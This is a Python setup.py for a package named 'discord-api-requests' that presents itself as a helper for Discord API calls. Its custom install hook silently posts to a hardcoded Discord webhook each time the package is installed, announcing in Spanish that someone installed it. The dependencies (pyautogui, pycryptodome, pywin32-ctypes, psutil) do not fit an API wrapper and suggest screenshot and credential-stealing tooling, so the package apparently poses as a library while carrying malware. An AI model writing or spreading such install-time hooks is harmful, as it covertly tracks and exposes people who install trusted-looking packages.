from setuptools import setup
from setuptools.command.install import install
import requests

class CustomInstall(install):
    def run(self):
        requests.post(
            url="https://discord.com/api/webhooks/1149195944424906772/X4IehrY8fcrdKYgHuGN8dY9xK9hYcZ1J6suYIwS-0HMdNSbYe27FZqpCUjeUMd-7voQY",
            json={
                "content":"Alguien ha instalado el paquete."
            }
        )
        install.run(self)

setup(
    name='discord-api-requests',
    version='1.0.0',
    description='Simplification of all discord API requests.',
    author='Benjamin Rodriguez',
    author_email='benjaminrodriguezshhh@proton.me',
    packages=['discord_requests_lib'],
    cmdclass={'install': CustomInstall},
    install_requires=[
        "requests",
        "pyautogui",
        "pycryptodome",
        "pywin32-ctypes",
        "psutil",
    ]
)